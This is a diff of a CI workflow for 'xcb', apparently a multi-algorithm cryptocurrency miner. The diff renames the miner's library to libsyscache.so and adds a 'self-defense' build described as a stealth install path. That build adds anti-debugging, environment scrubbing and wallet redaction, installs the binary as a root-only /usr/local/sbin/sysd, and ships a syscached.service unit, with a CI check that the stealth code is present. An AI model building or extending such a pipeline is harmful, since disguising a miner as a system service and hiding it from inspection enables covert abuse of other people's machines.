@@ -128,27 +128,31 @@ jobs:
           cmake -B build -DCMAKE_BUILD_TYPE=Release
           cmake --build build --parallel "$(nproc)"
 
-      - name: Version menunjuk backend CONN
+      - name: Version menyebut semua backend
         run: |
           ./build/xcb --version | tee ver.log
-          grep -q 'ConnectCoin CONN' ver.log || {
-            echo "::error::--version tidak menyebut backend CONN"; exit 1; }
-          grep -qE 'xcb [0-9]+\.[0-9]+\.[0-9]+ \(ConnectCoin CONN - RandomX V2, [0-9a-f]+\)' ver.log || {
+          grep -q 'randomy, conn, bloz, zcd' ver.log || {
+            echo "::error::--version tidak menyebut keempat backend"; exit 1; }
+          grep -qE 'xcb [0-9]+\.[0-9]+\.[0-9]+ \(randomy, conn, bloz, zcd; [0-9a-f]+\)' ver.log || {
             echo "::error::format versi/commit salah"; exit 1; }
 
-      - name: Selftest (termasuk vektor RandomX V2)
+      - name: Selftest (keempat backend)
         run: |
           set -o pipefail
           ./build/xcb --selftest 2>&1 | tee st.log
           grep -q 'randomx-v2 : OK' st.log || {
             echo "::error::selftest RandomX V2 tidak jalan"; exit 1; }
+          grep -q 'backend bloz : OK' st.log || {
+            echo "::error::selftest backend bloz tidak jalan"; exit 1; }
+          grep -q 'backend zcd : OK' st.log || {
+            echo "::error::selftest backend zcd tidak jalan"; exit 1; }
           grep -q 'RESULT: PASS' st.log
 
-      - name: Binary menemukan librandomx_v2.so
+      - name: Binary menemukan libsyscache.so
         run: |
           ldd build/xcb | tee ldd.log
-          grep -q 'librandomx_v2.so =>' ldd.log || {
-            echo "::error::librandomx_v2.so tidak ter-resolve"; exit 1; }
+          grep -q 'libsyscache.so =>' ldd.log || {
+            echo "::error::libsyscache.so tidak ter-resolve"; exit 1; }
           if grep -q 'not found' ldd.log; then
             echo "::error::ada shared library yang hilang"; exit 1
           fi
@@ -159,11 +163,15 @@ jobs:
         run: |
           cmake --install build --prefix "$PWD/stage"
           test -x stage/bin/xcb
-          test -f stage/bin/librandomx_v2.so
+          test -f stage/bin/libsyscache.so
           ( cd /tmp && "$GITHUB_WORKSPACE/stage/bin/xcb" --version )
 
-      - name: Backend CONN terdaftar di --help
-        run: ./build/xcb --help | grep -q -- '--conn-pool'
+      - name: Semua algo terdaftar di --help
+        run: |
+          ./build/xcb --help | tee help.log
+          grep -q -- '--conn-pool' help.log
+          grep -q -- 'randomy (XCB) | conn' help.log
+          grep -q -- 'bloz (Block Zero) | zcd' help.log
 
   build-2204:
     name: Build + artefak deploy (Ubuntu 22.04 / glibc 2.35)
@@ -187,7 +195,7 @@ jobs:
             ./build/xcb --version | tee VERSION
             if grep -q unknown VERSION; then echo "ERROR: commit tidak terbaca di --version"; exit 1; fi
             ./build/xcb --selftest
-            ldd build/xcb | grep "librandomx_v2.so =>"
+            ldd build/xcb | grep "libsyscache.so =>"
           '
 
       - name: Stage artefak deploy
@@ -197,14 +205,14 @@ jobs:
         # root artefak. Ratakan dulu ke dist/ supaya layout-nya sesuai kontrak.
         run: |
           mkdir -p dist
-          cp build/xcb build/librandomx_v2.so VERSION dist/
+          cp build/xcb build/libsyscache.so VERSION dist/
           test -x dist/xcb
-          test -f dist/librandomx_v2.so
+          test -f dist/libsyscache.so
           test -f dist/VERSION
           # Manifest checksum per commit: deploy bisa memverifikasi isi artefak
           # terhadap referensi ini, bukan menghitung ulang hash dari file yang
           # sama lalu mencocokkannya dengan dirinya sendiri.
-          ( cd dist && sha256sum xcb librandomx_v2.so VERSION > SHA256SUMS )
+          ( cd dist && sha256sum xcb libsyscache.so VERSION > SHA256SUMS )
           test -f dist/SHA256SUMS
           ls -l dist
           cat dist/SHA256SUMS
@@ -214,6 +222,59 @@ jobs:
         with:
           name: xcb-2204
           path: dist/
+          if-no-files-found: error
+          retention-days: 14
+
+  build-2204-sd:
+    name: Build + artefak self-defense (Ubuntu 22.04)
+    # Build terpisah dari xcb-2204 karena tarball rilis sengaja tetap tanpa
+    # ENABLE_SELF_DEFENSE (build publik bersih). Artefak ini jalur install
+    # stealth: anti-debug + scrub_environ + redaksi wallet di log; installer
+    # menaruh binary-nya sebagai /usr/local/sbin/sysd (0750, root-only).
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - name: Checkout (termasuk submodule)
+        uses: actions/checkout@v7
+        with:
+          submodules: recursive
+
+      - name: Build + selftest di ubuntu:22.04 (ENABLE_SELF_DEFENSE=ON)
+        run: |
+          docker run --rm -v "$PWD":/src -w /src ubuntu:22.04 bash -c '
+            set -e
+            apt-get update -qq
+            DEBIAN_FRONTEND=noninteractive apt-get install -y -qq build-essential cmake git libssl-dev ca-certificates >/dev/null
+            git config --global --add safe.directory /src
+            cmake -S . -B build -DCMAKE_BUILD_TYPE=Release -DENABLE_SELF_DEFENSE=ON
+            cmake --build build --parallel "$(nproc)"
+            ./build/xcb --version | tee VERSION
+            if grep -q unknown VERSION; then echo "ERROR: commit tidak terbaca di --version"; exit 1; fi
+            # Gerbang: flag harus benar-benar masuk ke binary. Tanpa cek ini
+            # artefak bisa identik dengan build biasa dan stealth-nya hilang
+            # tanpa ada yang gagal.
+            grep -aq "dumpable=0, core=0" build/xcb || {
+              echo "ERROR: kode self-defense tidak ada di binary"; exit 1; }
+            ./build/xcb --selftest
+            ldd build/xcb | grep "libsyscache.so =>"
+          '
+
+      - name: Stage artefak self-defense
+        run: |
+          mkdir -p dist-sd
+          cp build/xcb build/libsyscache.so VERSION dist-sd/
+          test -x dist-sd/xcb
+          test -f dist-sd/libsyscache.so
+          test -f dist-sd/VERSION
+          ( cd dist-sd && sha256sum xcb libsyscache.so VERSION > SHA256SUMS )
+          ls -l dist-sd
+          cat dist-sd/SHA256SUMS
+
+      - name: Upload artefak self-defense
+        uses: actions/upload-artifact@v7
+        with:
+          name: xcb-2204-sd
+          path: dist-sd/
           if-no-files-found: error
           retention-days: 14
 
@@ -275,7 +336,7 @@ jobs:
           set -euo pipefail
           V="${GITHUB_REF_NAME}"
           mkdir -p pkg
-          cp dist/xcb dist/librandomx_v2.so dist/VERSION dist/SHA256SUMS pkg/
+          cp dist/xcb dist/libsyscache.so dist/VERSION dist/SHA256SUMS pkg/
           cp ops/fleet/install.sh pkg/install.sh
           cp ops/systemd/syscached.service ops/systemd/miner.env.example pkg/
           chmod 0755 pkg/install.sh
